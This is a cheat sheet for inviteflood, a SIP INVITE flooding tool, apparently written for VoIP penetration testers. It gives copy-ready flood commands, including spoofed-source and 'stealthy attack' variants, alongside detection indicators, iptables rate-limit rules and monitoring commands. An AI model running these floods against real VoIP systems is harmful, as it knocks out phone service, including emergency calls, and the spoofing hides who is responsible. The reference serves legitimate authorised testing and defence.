# Inviteflood Quick Reference

## Installation

```bash
sudo apt install inviteflood
```

## Basic Syntax

```bash
inviteflood <interface> <target_user> <domain> <target_ip> <packet_count>
```

## Basic Commands

| Command | Description |
|---------|-------------|
| `sudo inviteflood eth0 5000 example.local 192.168.1.5 100` | Basic flood |
| `sudo inviteflood -v eth0 5000 example.local 192.168.1.5 100` | Verbose |
| `sudo inviteflood -i 10.0.0.1 eth0 5000 example.local 192.168.1.5 100` | Spoofed source |
| `sudo inviteflood -a "alias" eth0 5000 example.local 192.168.1.5 100` | Custom alias |
| `sudo inviteflood -s 5000 eth0 5000 example.local 192.168.1.5 1000` | Delayed |

## Options Reference

```
-a "alias"     # "From:" alias
-i IP          # Source IP (spoof)
-S PORT        # Source port (default: 9)
-D PORT        # Dest port (default: 5060)
-l "line"      # Line string (SNOM)
-s USEC        # Sleep between messages
-v             # Verbose mode
-h             # Help
```

## Quick Scenarios

### Basic SIP Flood
```bash
sudo inviteflood eth0 5000 example.local 192.168.1.100 100
```

### PBX Server Test
```bash
sudo inviteflood eth0 "1001" example.local 192.168.1.10 500
```

### Stealthy Attack
```bash
sudo inviteflood -s 10000 -i 10.0.0.1 eth0 5000 example.local 192.168.1.5 1000
```

### SIP Trunk Test
```bash
sudo inviteflood eth0 "trunk" sip.provider.com 203.0.113.10 1000
```

## SIP Protocol Basics

| Element | Description |
|---------|-------------|
| INVITE | Initiates call |
| ACK | Confirms call setup |
| BYE | Terminates call |
| CANCEL | Cancels pending call |
| REGISTER | Registers endpoint |

## Common SIP Ports

| Port | Service |
|------|---------|
| 5060 | SIP (UDP/TCP) |
| 5061 | SIP-TLS |
| 5080 | Alternative SIP |

## Detection Indicators

- Rapid INVITE messages from single source
- Multiple "From:" headers
- Unusual source IP patterns
- High SIP traffic volume

## Defense Quick Fixes

```bash
# Rate limit SIP (iptables)
iptables -A INPUT -p udp --dport 5060 -m string --string "INVITE sip:" -m limit --limit 20/s -j ACCEPT
iptables -A INPUT -p udp --dport 5060 -m string --string "INVITE sip:" -j DROP

# Limit connections
iptables -A INPUT -p udp --dport 5060 -m connlimit --connlimit-above 10 -j DROP
```

## Monitor Commands

```bash
# Watch SIP traffic
tcpdump -i eth0 port 5060 -n

# Count INVITEs
tcpdump -i eth0 port 5060 -n | grep "INVITE" | wc -l

# Asterisk monitoring
asterisk -rx "core show channels"
asterisk -rx "sip show peers"
```

## System Requirements

- Root/sudo privileges
- Access to target network
- libnet9 installed
- Promiscuous mode NIC

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Permission denied | Run with `sudo` |
| No SIP server | Verify with `nmap -sU -p 5060` |
| Wrong interface | Check `ifconfig -a` |
| Low packet count | Increase packet_count |

## Legal Reminder

**Authorized testing only!** Inviteflood disrupts VoIP services. Always obtain written permission before testing.
